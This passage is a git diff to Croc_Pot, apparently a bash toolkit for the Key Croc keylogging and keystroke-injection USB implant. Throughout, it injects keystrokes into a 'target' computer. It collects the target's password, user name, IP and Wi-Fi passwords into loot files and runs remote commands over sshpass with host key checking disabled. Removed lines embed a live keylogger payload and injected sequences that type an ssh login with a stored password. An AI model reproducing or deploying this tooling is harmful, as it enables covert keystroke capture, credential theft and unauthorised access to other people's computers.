+			$'\e'"${fnkey[2]}") QUACK F2 ; echo -ne " F2 \n\nYou have exited returned to the main menu" ; QUACK UNLOCK ; trap - SIGINT ; stty echo ; break ;;
+			$'\e'"${fnkey[3]}") QUACK F3 ; echo -ne " F3 " ;;
+			$'\e'"${fnkey[4]}") QUACK F4 ; echo -ne " F4 " ;;
+			$'\e'"${fnkey[5]}") QUACK F5 ; echo -ne " F5 " ;;
+			$'\e'"${fnkey[6]}") QUACK F6 ; echo -ne " F6 " ;;
+			$'\e'"${fnkey[7]}") QUACK F7 ; echo -ne " F7 " ;;
+			$'\e'"${fnkey[8]}") QUACK F8 ; echo -ne " F8 " ;;
+			$'\e'"${fnkey[9]}") QUACK F9 ; echo -ne " F9 " ;;
+			$'\e'"${fnkey[10]}") QUACK F10 ; echo -ne " F10 " ;;
+			$'\e'"${fnkey[11]}") QUACK F11 ; echo -ne " F11 " ;;
+			$'\e'"${fnkey[12]}") QUACK F12 ; echo -ne " F12 " ;;
+			$'\E[1;2P') QUACK SHIFT-F1 ; echo -ne " SHIFT-F1 " ;;
+			$'\E[1;2Q') QUACK SHIFT-F2 ; echo -ne " SHIFT-F2 " ;;
+			$'\E[1;2R') QUACK SHIFT-F3 ; echo -ne " SHIFT-F3 " ;;
+			$'\E[1;2S') QUACK SHIFT-F4 ; echo -ne " SHIFT-F4 " ;;
+			$'\E[15;2~') QUACK SHIFT-F5 ; echo -ne " SHIFT-F5 " ;;
+			$'\E[17;2~') QUACK SHIFT-F6 ; echo -ne " SHIFT-F6 " ;;
+			$'\E[18;2~') QUACK SHIFT-F7 ; echo -ne " SHIFT-F7 " ;;
+			$'\E[19;2~') QUACK SHIFT-F8 ; echo -ne " SHIFT-F8 " ;;
+			$'\E[20;2~') QUACK SHIFT-F9 ; echo -ne " SHIFT-F9 " ;;
+			$'\E[21;2~') QUACK SHIFT-F10 ; echo -ne " SHIFT-F10 " ;;
+			$'\E[23;2~') QUACK SHIFT-F11 ; echo -ne " SHIFT-F11 " ;;
+			$'\E[24;2~') QUACK SHIFT-F12 ; echo -ne " SHIFT-F12 " ;;
+			$'\e[Z') QUACK SHIFT-TAB ; echo -ne " SHIFT-TAB " ;;
+			$'\el') QUACK CAPSLOCK ; echo -ne " CAPSLOCK " ;;
+			$'\es') QUACK ALT-SPACE ; echo -ne " ALT-SPACE " ;;
+			$'\en') QUACK NUMLOCK ; echo -ne " NUMLOCK " ;;
+			$'\ep') QUACK PRINTSCREEN ; echo -ne " PRINTSCREEN " ;;
+			$'\e[5~') QUACK KEYCODE 00,00,4b ; echo -ne " PAGEUP " ;;
+			$'\e[6~') QUACK PAGEDOWN ; echo -ne " PAGEDOWN " ;;
+			$'\e[2~') QUACK INSERT ; echo -ne " INSERT " ;;
+			$'\e[3~') QUACK DELETE ; echo -ne " DELETE " ;;
+			$'\t') QUACK TAB ; echo -ne " TAB " ;;
+			$'\e[F') QUACK END ; echo -ne " END " ;;
+			$'\e[H') QUACK HOME ; echo -ne " HOME " ;;
+			$'\033') QUACK ESCAPE ; echo -ne " ESC " ;;
+			$'\E[A') QUACK UPARROW ; echo -ne " UPARROW " ;;
+			$'\E[B') QUACK DOWNARROW ; echo -ne " DOWNARROW " ;;
+			$'\E[D') QUACK LEFTARROW ; echo -ne " LEFTARROW " ;;
+			$'\E[C') QUACK RIGHTARROW ; echo -ne " RIGHTARROW " ;;
+			$'\e8') QUACK CONTROL-ALT-d ; echo -ne " CTRL-ALT-D " ;;
+			$'\e9') QUACK CONTROL-ALT-t ; echo -ne " CTRL-ALT-T " ;;
+			$'\ez') QUACK CONTROL-z ; echo -ne " CTRL-Z " ;;
+			$'\177') QUACK BACKSPACE ; echo -ne "\b \b" ;;
+			$'\x20') QUACK KEYCODE 00,00,2c ; echo -ne " " ;;
+			$'\ex') QUACK GUI x ; echo -ne " GUI-X " ;;
+			$'\e5') QUACK GUI r ; echo -ne " GUI-R " ;;
+			$'\e6') QUACK GUI d ; echo -ne " GUI-D " ;;
+			$'\e7') QUACK GUI l ; echo -ne " GUI-L " ;;
+			$'\ei') QUACK GUI i ; echo -ne " GUI-I " ;;
+			$'\e0') QUACK GUI ; echo -ne " GUI " ;;
+			$'\e1') QUACK ALT-1 ; echo -ne " ALT-1 " ;;
+			$'\e2') QUACK ALT-2 ; echo -ne " ALT-2 " ;;
+			$'\e3') QUACK ALT-3 ; echo -ne " ALT-3 " ;;
+			$'\e4') QUACK ALT-F4 ; echo -ne " ALT-F4 " ;;
+			$'\e.') QUACK ALT-. ; echo -ne " ALT-. " ;;
+			$'\ea') QUACK ALT-a ; echo -ne " ALT-A " ;;
+			$'\eb') QUACK ALT-b ; echo -ne " ALT-B " ;;
+			$'\ec') QUACK ALT-SPACE ; Q c ; echo -ne " ALT-SPACE-C " ;;
+			$'\ed') QUACK ALT-d ; echo -ne " ALT-D " ;;
+			$'\ee') QUACK ALT-e ; echo -ne " ALT-E " ;;
+			$'\ef') QUACK ALT-f ; echo -ne " ALT-F " ;;
+			$'\eg') QUACK ALT-g ; echo -ne " ALT-G " ;;
+			$'\eh') QUACK ALT-h ; echo -ne " ALT-H " ;;
+			$'\ej') QUACK ALT-j ; echo -ne " ALT-J " ;;
+			$'\ek') QUACK ALT-k ; echo -ne " ALT-K " ;;
+			$'\eu') QUACK UNLOCK ; echo -ne " Unlocking Local keyboard " ;;
+			$'\eo') QUACK LOCK ; echo -ne " Locking Local keyboard " ;;
+			$'\et') QUACK ALT-t ; echo -ne " ALT-t " ;;
+			$'\ev') QUACK ALT-v ; echo -ne " ALT-V " ;;
+			$'\ey') QUACK ALT-y ; echo -ne " ALT-Y " ;;
+			$'\eA') QUACK ALT-SHIFT-a ; echo -ne " ALT-SHIFT-A " ;;
+			$'\eB') QUACK ALT-SHIFT-b ; echo -ne " ALT-SHIFT-B " ;;
+			$'\eC') QUACK ALT-SHIFT-c ; echo -ne " ALT-SHIFT-C " ;;
+			$'\eD') QUACK ALT-SHIFT-d ; echo -ne " ALT-SHIFT-D " ;;
+			$'\eE') QUACK ALT-ESCAPE ; echo -ne " ALT-ESC " ;;
+			$'\eF') QUACK ALT-SHIFT-f ; echo -ne " ALT-SHIFT-F " ;;
+			$'\eP') QUACK ALT-SHIFT-p ; echo -ne " ALT-SHIFT-P " ;;
+			$'\eW') QUACK ALT-SHIFT-w ; echo -ne " ALT-SHIFT-W " ;;
+			$'\eL') QUACK ALT-SHIFT-l ; echo -ne " ALT-SHIFT-L " ;;
+			$'\eT') QUACK ALT-TAB ; echo -ne " ALT-TAB " ;;
+			$'\e[1;3P') QUACK ALT-F1 ; echo -ne " ALT-F1 " ;;
+			$'\e[1;3Q') QUACK ALT-F2 ; echo -ne " ALT-F2 " ;;
+			$'\e[1;3R') QUACK ALT-F3 ; echo -ne " ALT-F3 " ;;
+			$'\e[1;3S') QUACK ALT-F4 ; echo -ne " ALT-F4 " ;;
+			$'\e[15;3~') QUACK ALT-F5 ; echo -ne " ALT-F5 " ;;
+			$'\e[17;3~') QUACK ALT-F6 ; echo -ne " ALT-F6 " ;;
+			$'\e[18;3~') QUACK ALT-F7 ; echo -ne " ALT-F7 " ;;
+			$'\e[19;3~') QUACK ALT-F8 ; echo -ne " ALT-F8 " ;;
+			$'\e[20;3~') QUACK ALT-F9 ; echo -ne " ALT-F9 " ;;
+			$'\e[21;3~') QUACK ALT-F10 ; echo -ne " ALT-F10 " ;;
+			$'\e[23;3~') QUACK ALT-F11 ; echo -ne " ALT-F11 " ;;
+			$'\e[24;3~') QUACK ALT-F12 ; echo -ne " ALT-F12 " ;;
+			$'\e[1;3A') QUACK ALT-UPARROW ; echo -ne " ALT-UPARROW " ;;
+			$'\e[1;3B') QUACK ALT-DOWNARROW ; echo -ne " ALT-DOWNARROW " ;;
+			$'\e[1;3C') QUACK ALT-RIGHTARROW ; echo -ne " ALT-RIGHTARROW " ;;
+			$'\e[1;3D') QUACK ALT-LEFTARROW ; echo -ne " ALT-LEFTARROW " ;;
+			$'\e[1;6A') QUACK CONTROL-SHIFT-UPARROW ; echo -ne " CTRL-SHIFT-UPARROW " ;;
+			$'\e[1;6B') QUACK CONTROL-SHIFT-DOWNARROW ; echo -ne " CTRL-SHIFT-DOWNARROW " ;;
+			$'\e[1;6C') QUACK CONTROL-SHIFT-RIGHTARROW ; echo -ne " CTRL-SHIFT-RIGHTARROW " ;;
+			$'\e[1;6D') QUACK CONTROL-SHIFT-LEFTARROW ; echo -ne " CTRL-SHIFT-LEFTARROW " ;;
+			$'\e[1;5A') QUACK CONTROL-UPARROW ; echo -ne " CTRL-UPARROW " ;;
+			$'\e[1;5B') QUACK CONTROL-DOWNARROW ; echo -ne " CTRL-DOWNARROW " ;;
+			$'\e[1;5C') QUACK CONTROL-RIGHTARROW ; echo -ne " CTRL-RIGHTARROW " ;;
+			$'\e[1;5D') QUACK CONTROL-LEFTARROW ; echo -ne " CTRL-LEFTARROW " ;;
+			$'\e[1;2A') QUACK SHIFT-UPARROW ; echo -ne " SHIFT-UPARROW " ;;
+			$'\e[1;2B') QUACK SHIFT-DOWNARROW ; echo -ne " SHIFT-DOWNARROW " ;;
+			$'\e[1;2C') QUACK SHIFT-RIGHTARROW ; echo -ne " SHIFT-RIGHTARROW " ;;
+			$'\e[1;2D') QUACK SHIFT-LEFTARROW ; echo -ne " SHIFT-LEFTARROW " ;;
+			$'\0') QUACK ENTER ; echo -ne " ENTER \n" ;;
+			[[:graph:]]) QUACK STRING "$key_press" ; echo -ne "$key_press" ;;
 			*)
 			case "$key_code" in
-				1) Q CONTROL-a ; echo -ne " CTRL-A " ;;
-				2) Q CONTROL-b ; echo -ne " CTRL-B " ;;
-				4) Q CONTROL-d ; echo -ne " CTRL-D " ;;
-				5) Q CONTROL-e ; echo -ne " CTRL-E " ;;
-				6) Q CONTROL-f ; echo -ne " CTRL-F " ;;
-				7) Q CONTROL-g ; echo -ne " CTRL-G " ;;
-				8) Q CONTROL-h ; echo -ne " CTRL-H " ;;
-				10) Q CONTROL-j ; echo -ne " CTRL-J " ;;
-				11) Q CONTROL-k ; echo -ne " CTRL-K " ;;
-				12) Q CONTROL-l ; echo -ne " CTRL-L " ;;
-				13) Q CONTROL-m ; echo -ne " CTRL-M " ;;
-				14) Q CONTROL-n ; echo -ne " CTRL-N " ;;
-				15) Q CONTROL-o ; echo -ne " CTRL-O " ;;
-				16) Q CONTROL-p ; echo -ne " CTRL-P " ;;
-				17) Q CONTROL-q ; echo -ne " CTRL-Q " ;;
-				18) Q CONTROL-r ; echo -ne " CTRL-R " ;;
-				19) Q CONTROL-s ; echo -ne " CTRL-S " ;;
-				20) Q CONTROL-TAB ; echo -ne " CTRL-TAB " ;;
-				21) Q CONTROL-u ; echo -ne " CTRL-U " ;;
-				22) Q CONTROL-v ; echo -ne " CTRL-V " ;;
-				23) Q CONTROL-w ; echo -ne " CTRL-W " ;;
-				24) Q CONTROL-x ; echo -ne " CTRL-X " ;;
-				25) Q CONTROL-y ; echo -ne " CTRL-Y " ;;
-			esac ;;
+				1) QUACK CONTROL-a ; echo -ne " CTRL-A " ;;
+				2) QUACK CONTROL-b ; echo -ne " CTRL-B " ;;
+				4) QUACK CONTROL-d ; echo -ne " CTRL-D " ;;
+				5) QUACK CONTROL-e ; echo -ne " CTRL-E " ;;
+				6) QUACK CONTROL-f ; echo -ne " CTRL-F " ;;
+				7) QUACK CONTROL-g ; echo -ne " CTRL-G " ;;
+				8) QUACK CONTROL-h ; echo -ne " CTRL-H " ;;
+				10) QUACK CONTROL-j ; echo -ne " CTRL-J " ;;
+				11) QUACK CONTROL-k ; echo -ne " CTRL-K " ;;
+				12) QUACK CONTROL-l ; echo -ne " CTRL-L " ;;
+				13) QUACK CONTROL-m ; echo -ne " CTRL-M " ;;
+				14) QUACK CONTROL-n ; echo -ne " CTRL-N " ;;
+				15) QUACK CONTROL-o ; echo -ne " CTRL-O " ;;
+				16) QUACK CONTROL-p ; echo -ne " CTRL-P " ;;
+				17) QUACK CONTROL-q ; echo -ne " CTRL-Q " ;;
+				18) QUACK CONTROL-r ; echo -ne " CTRL-R " ;;
+				19) QUACK CONTROL-s ; echo -ne " CTRL-S " ;;
+				20) QUACK CONTROL-TAB ; echo -ne " CTRL-TAB " ;;
+				21) QUACK CONTROL-u ; echo -ne " CTRL-U " ;;
+				22) QUACK CONTROL-v ; echo -ne " CTRL-V " ;;
+				23) QUACK CONTROL-w ; echo -ne " CTRL-W " ;;
+				24) QUACK CONTROL-x ; echo -ne " CTRL-X " ;;
+				25) QUACK CONTROL-y ; echo -ne " CTRL-Y " ;;
+			esac
+			;;
 		esac
 	done ;;
 	[nN] | [nN][oO])
@@ -7153,7 +7250,7 @@ esac
 	MenuTitle 'QUACK EXPLORE MENU'
 	MenuColor 21 1 'QUACK TARGET TERMINAL'
 	MenuColor 21 2 'QUACK OVER SSH'
-	MenuColor 21 3 'QUACK TARGET PC'
+	MenuColor 21 3 'QUACK TARGET'
 	MenuColor 21 4 'PAYLOAD STARTER'
 	MenuColor 21 5 'REMOTE REPLACE'
 	MenuColor 21 6 'KEYBOARD ACTIVITY'
@@ -7170,6 +7267,7 @@ esac
 		7) remote_keyboard ; insert_quack ;;
 		8) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; insert_quack ;;
 		[pP]) Panic_button ;; [bB]) croc_pot_plus ;; *) invalid_entry ; insert_quack ;;
 	esac
 }
@@ -7230,7 +7328,7 @@ ChatGPT: Bye! Have a great day!
 					*)
 						prompt="ChatGPT: $user_input" ;;
 				esac
-				response=$(curl -s -k -X POST "https://api.openai.com/v1/engines/text-davinci-002/completions" \
+				response=$(curl -s -X POST https://api.openai.com/v1/engines/text-davinci-003/completions \
 				-H "Content-Type: application/json" \
 				-H "Authorization: Bearer $api_key" \
 				-d "{
@@ -7284,6 +7382,7 @@ ChatGPT: Bye! Have a great day!
 		7) chat_openai ; croc_pot_plus ;;
 		8) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; croc_pot_plus ;;
 		[pP]) Panic_button ;;
 		kp | KP) start_icmp ; croc_pot_plus ;;
 		st | ST) reset_broken ; croc_pot_plus ;;
@@ -7312,8 +7411,13 @@ memory_check() {
 	(croc_title_loot "MEMORY STATUS ON ${server_name^^}"
 	ColorYellow "$(df -h | xargs | awk '{print "Free/total disk: " $11 " / " $9}')$clear\n$LINE
 	$(grep -E --color=auto 'Mem|Cache|Swap' /proc/meminfo)\n$LINE\n$(free -t -m)\n$LINE
-	$(cat /proc/meminfo)\n$LINE\n$(vmstat)\n$LINE\n$(df -h)\n$LINE\n$(iostat)\n$LINE
-$(cd / ; for i in `ls -d /*` ; do g=`find ./"$i" -type f -print | wc -l` ; ColorYellow "Keycroc-Directory:$(ColorCyan " $i ")$(ColorYellow 'Contains:')$(ColorGreen " $g ")$(ColorYellow 'files.')\n"; done 2>/dev/null)"
+	$(cat /proc/meminfo)\n$LINE\n$(vmstat)\n$LINE\n$(df -h)\n$LINE\n$(lsblk)\n$LINE
+$(for dir in {bin,boot,dev,etc,home,lib,lost+found,media,mnt,proc,root,run,sbin,srv,sys,tmp,usr,var,opt}; do
+	count=$(find "/$dir" -type f 2>/dev/null | wc -l)
+	if [ $? -eq 0 ]; then
+	ColorYellow "Directory:$(ColorCyan " /$dir ")$(ColorYellow 'Contains:')$(ColorGreen " $count ")$(ColorYellow 'files.')\n"
+	fi
+done)"
 	echo "$LINE") | tee "$LOOT_INFO"
 	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" "$LOOT_INFO"
 }
@@ -7370,7 +7474,7 @@ ${LINE}\nRUNNING SERVICES:\n$(service --status-all)\n${LINE}\nINSTALLED PACKAGES
 	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" "$LOOT_INFO"
 }
 ##
-#----Status of target pc info loot from Croc_Pot_Payload scan
+#----Status of target info loot from Croc_Pot_Payload scan
 ##
 pc_info() {
 	printf '\033[H\033[2J'
@@ -7378,33 +7482,37 @@ pc_info() {
 	local CROC_OS=/root/udisk/tools/Croc_Pot/Croc_OS.txt
 	local CROC_OS_TARGET=/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt
 if [ "$(OS_CHECK)" = WINDOWS ]; then
-	(croc_title_loot 'TARGET PC INFO'
+	(croc_title_loot 'TARGET INFO'
 	ColorYellow "KeyCroc is pluged into: $(ColorGreen "$(OS_CHECK)")
-	$(ColorYellow 'Target PC Host name: ')$(ColorGreen "$(sed -n 3p $CROC_OS)")
-	$(ColorYellow 'Target PC Passwd: ')$(ColorGreen "$(target_pw)")
-	$(ColorYellow 'Target Pc user name: ')$(ColorGreen "$(sed -n 1p $CROC_OS_TARGET)")
-	$(ColorYellow 'Target Pc IP: ')$(ColorGreen "$(sed '2,6!d' $CROC_OS_TARGET)")
-	$(ColorYellow 'Target Pc SSID + PASSWD and MAC address:')
+	$(ColorYellow 'Target Host name: ')$(ColorGreen "$(sed -n 3p $CROC_OS)")
+	$(ColorYellow 'Target Passwd: ')$(ColorGreen "$(target_pw)")
+	$(ColorYellow 'Target user name: ')$(ColorGreen "$(sed -n 1p $CROC_OS_TARGET)")
+	$(ColorYellow 'Target IP: ')$(ColorGreen "$(sed '2,6!d' $CROC_OS_TARGET)")
+	$(ColorYellow 'Target SSID + PASSWD and MAC address:')
 	$(ColorGreen "$(sed '9,24!d' $CROC_OS_TARGET)")\n"
 	sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$TARGET_USERNAME"@"$(os_ip)" 'powershell -Command "& {Get-ChildItem -Recurse | ?{ $_.PSIsContainer } | Select-Object FullName, ` @{Name=\"FileCount\";Expression={(Get-ChildItem $_ -File | Measure-Object).Count }}}"' 2>/dev/null
 	sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$TARGET_USERNAME"@"$(os_ip)" 'powershell -Command "& {systeminfo}"'
 	echo "$LINE") | tee "$LOOT_INFO"
 	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" "$LOOT_INFO"
 elif [ "$(OS_CHECK)" = LINUX ]; then
-	(croc_title_loot 'TARGET PC INFO'
+	(croc_title_loot 'TARGET INFO'
 	ColorYellow "KeyCroc is pluged into: $(ColorGreen "$(OS_CHECK)")
-	$(ColorYellow 'Target PC Host name: ')$(ColorGreen "$(sed -n 3p $CROC_OS)")
-	$(ColorYellow 'Target PC Passwd: ')$(ColorGreen "$(target_pw)")
-	$(ColorYellow 'Target Pc user name: ')$(ColorGreen "$(sed -n 1p $CROC_OS_TARGET)")
-	$(ColorYellow 'Target Pc IP: ')$(ColorGreen "$(sed '2,3!d' $CROC_OS_TARGET)")
-	$(ColorYellow 'Target Pc SSID + PASSWD and MAC address:')
+	$(ColorYellow 'Target Host name: ')$(ColorGreen "$(sed -n 3p $CROC_OS)")
+	$(ColorYellow 'Target Passwd: ')$(ColorGreen "$(target_pw)")
+	$(ColorYellow 'Target user name: ')$(ColorGreen "$(sed -n 1p $CROC_OS_TARGET)")
+	$(ColorYellow 'Target IP: ')$(ColorGreen "$(sed '2,3!d' $CROC_OS_TARGET)")
+	$(ColorYellow 'Target SSID + PASSWD and MAC address:')
 	$(ColorGreen "$(sed '4,20!d' $CROC_OS_TARGET)")\n"
 	sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$TARGET_USERNAME"@"$(os_ip)" 'hostnamectl ; echo "'"${LINE}"'" ; netstat -r ; echo "'"${LINE}"'"'
-	sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$TARGET_USERNAME"@"$(os_ip)" 'cd / ; for i in `ls -d /*` ; do g=`sudo find ./$i -type f -print | wc -l` ; echo -ne "'"$yellow"'TARGET PC Directory: '"$clear"''"$cyan"'$i '"$clear"''"$yellow"'Contains: '"$clear"''"$green"'$g '"$clear"''"$yellow"'files.'"$clear"'\n"; done 2>/dev/null'
+	sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$TARGET_USERNAME"@"$(os_ip)" 'for dir in {bin,boot,dev,etc,home,lib,lost+found,media,mnt,proc,root,run,sbin,srv,sys,tmp,usr,var,opt}; do count=$(find "/$dir" 2>/dev/null | wc -l); if [ $? -eq 0 ]; then printf "'"$yellow"'Directory: '"$cyan"'/%s'"$yellow"' Contains: '"$green"'%s'"$yellow"' files.'"$clear"'\n" "$dir" "$count"; fi; done'
 	echo "$LINE") | tee "$LOOT_INFO"
 	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" "$LOOT_INFO"
 else
-	ColorRed '\nPLEASE RUN CROC_POT PAYLOAD TO GET TARGET PC USER NAME AND IP\n'
+	ColorRed '\nPLEASE RUN CROC_POT PAYLOAD TO GET TARGET USER NAME AND IP\n'
+fi
+if [ -f /root/udisk/tools/Croc_Pot/Target_File_Structure.txt ]; then
+	ColorYellow "Target File Structure:" ; sleep 2
+	cat /root/udisk/tools/Croc_Pot/Target_File_Structure.txt | more
 fi
 }
 ##
@@ -7415,108 +7523,28 @@ key_file() {
 -Scan loot/croc_char.log for match word/pattern
 -View live keystrokes'
 	keyboard_check
-	ColorYellow "Currently found $(ColorGreen "$(cat /root/udisk/loot/croc_char.log | wc -m)")$(ColorYellow ' characters in croc_char.log')\n\n"
+	ColorYellow "Currently found $(ColorGreen "$(find . -type f -name "croc_char.log" -exec cat {} + | wc -m)")$(ColorYellow ' characters in croc_char.log')\n\n"
 ##
-#----View Live keystrokes with payload
+#----View Live keystrokes
 ##
 keystrokes_V() {
-	Info_Screen '-View Live keystrokes with payload
--This will install a payload called Live_Keystroke.txt in payload folder
--After payload has installed reload payload with RELOAD_PAYLOADS command
--Option to open target pc terminal and run RELOAD_PAYLOADS command or
-manually enter RELOAD_PAYLOADS; exit in keycroc terminal
--Then we can run tail -f /tmp/livekey.txt command to view live keystrokes
--Run Live_Keystroke.txt payload as standalone ssh into keycroc and enter
-    tail -f /tmp/livekey.txt
-
--NOTE: With Live_Keystroke.txt payload installed in keycroc payload folder
-       NO OTHER PAYLOADS WILL EXECUTE BY KEYBOARD
--Recommended to uninstall payload when not in use, do to match word
--Press F1 to remove Live_keystroke payload and run RELOAD_PAYLOADS command 
+	Info_Screen '-View Live keystrokes
 -PRESS CONTROL + C TO EXIT live keylog'
-	read_all 'START LIVE KEYLOG Y/N AND PRESS [ENTER]'
-case "$r_a" in
-[yY] | [yY][eE][sS])
-	if [ -f "/root/udisk/payloads/Live_keystroke.txt" ]; then
-		cat /root/udisk/payloads/Live_keystroke.txt ; echo -ne "\n$LINE\n"
-		ColorGreen 'Live_keystroke PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER\n'
-		printf '\033[H\033[2J'
-		ColorYellow '\n\t\tkeystrokes will display here\n'
-		WAIT_FOR_KEYBOARD_ACTIVITY 1
-		tail -f /tmp/livekey.txt
-	else
-		read_all 'INSTALL LIVE_KEYSTROKE PAYLOAD Y/N AND PRESS [ENTER]'
-		case "$r_a" in
+	read_all 'Start tail the log file: loot/croc_char.log Y/N AND PRESS [ENTER]'
+	case "$r_a" in
 		[yY] | [yY][eE][sS])
-			echo -ne "# Title:         Live_keystroke\n#\n# Description:   Save keystroke entry to tmp/livekey.txt\n#                This payload is to be used with CROC_POT to view live keystroke\n#                Ran as standalone ssh into keycroc and enter tail -f /tmp/livekey.txt\n#                Recommended to uninstall payload when not in use, do to match word
-#                Press F1 to remove Live_keystroke payload and run RELOAD_PAYLOADS command\n#\n# Author:        Spywill\n# Version:       1.2\n# Category:      Key Croc\n
-MATCH (SHIFT|CONTROL|BACKSPACE|ENTER|RIGHTARROW|LEFTARROW|UPARROW|DOWNARROW|TAB|GUI|ALT|DELETE|F1|F2|F3|F4|F5|HOME|DELETE|ESCAPE|END|INSERT|PAGEUP|PAGEDOWN)\nMATCH ([0-9]|[a-z]|[A-Z]|[\`~!@#\$%^&*()_+=|;:',<\\\.>?/-]|[{]|[}]|[\"]|[ ])\n\nif [[ \"\$LOOT\" == \"SHIFT\" ]]; then\n	echo -ne \" SHIFT \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"HOME\" ]]; then\n	echo -ne \" HOME \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"END\" ]]; then\n	echo -ne \" END \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"CONTROL\" ]]; then\n	echo -ne \" CONTROL \" >> /tmp/livekey.txt
-elif [[ \"\$LOOT\" == \"PAGEUP\" ]]; then\n	echo -ne \" PAGEUP \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"INSERT\" ]]; then\n	echo -ne \" INSERT \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"DELETE\" ]]; then\n	echo -ne \" DELETE \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"BACKSPACE\" ]]; then\n	echo -ne \"\\\b \\\b\" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"ENTER\" ]]; then\n	echo -ne \" ENTER\\\n\" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"RIGHTARROW\" ]]; then\n	echo -ne \"\\\U1F812\" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"LEFTARROW\" ]]; then\n	echo -ne \"\\\U21FD\" >> /tmp/livekey.txt
-elif [[ \"\$LOOT\" == \"UPARROW\" ]]; then\n	echo -ne \"\\\U2191\" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"DOWNARROW\" ]]; then\n	echo -ne \"\\\U2193\" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"TAB\" ]]; then\n	echo -ne \" TAB \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"GUI\" ]]; then\n	echo -ne \" GUI \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"ESCAPE\" ]]; then\n	echo -ne \" ESCAPE \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"PAGEDOWN\" ]]; then\n	echo -ne \" PAGEDOWN \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"ALT\" ]]; then\n	echo -ne \" ALT \" >> /tmp/livekey.txt
-elif [[ \"\$LOOT\" == \"DELETE\" ]]; then\n	echo -ne \" DELETE \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"F1\" ]]; then\n	rm /root/udisk/payloads/Live_keystroke.txt\n	RELOAD_PAYLOADS\nelif [[ \"\$LOOT\" == \"F2\" ]]; then\n	echo -ne \" F2 \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"F3\" ]]; then\n	echo -ne \" F3 \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"F4\" ]]; then\n	echo -ne \" F4 \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"F5\" ]]; then\n	echo -ne \" F5 \" >> /tmp/livekey.txt\nelse\n	echo -ne \"\$LOOT\" >> /tmp/livekey.txt\nfi\n" > /root/udisk/payloads/Live_keystroke.txt
-		cat /root/udisk/payloads/Live_keystroke.txt ; echo -ne "\n$LINE\n"
-		ColorGreen 'Live_keystroke PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER\n'
-##
-#----Start second terminal on target pc to reload payload for (Live_Keystroke.txt)
-#----manually enter (RELOAD_PAYLOADS; exit) to reload payload
-##
-	Info_Screen '-After payload has installed need to reload payload
-Choose manually enter [ RELOAD_PAYLOADS; exit ] in keycroc terminal
-Choose terminal will open terminal on target pc
-Choose exit will need to unplug keycroc then plug back in'
-			read_all 'RELOAD PAYLOAD [M]-MANUALLY [T]-TARGET TERMINAL [E]-EXIT'
-			case "$r_a" in
-			[tT])
-				if [ "$(OS_CHECK)" = WINDOWS ]; then
-					Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 3 ; Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
-					Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 2 ; Q STRING "RELOAD_PAYLOADS; exit" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q GUI d
-				else
-					case "$HOST_CHECK" in
-						raspberrypi)
-							Q CONTROL-ALT-t ; sleep 1 ; Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
-							Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 2 ; Q STRING "RELOAD_PAYLOADS; exit" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q CONTROL-ALT-d ;;
-						"$HOST_CHECK")
-							Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
-							Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 2 ; Q STRING "RELOAD_PAYLOADS; exit" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q GUI d ;;
-						*)
-							Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1 ; Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
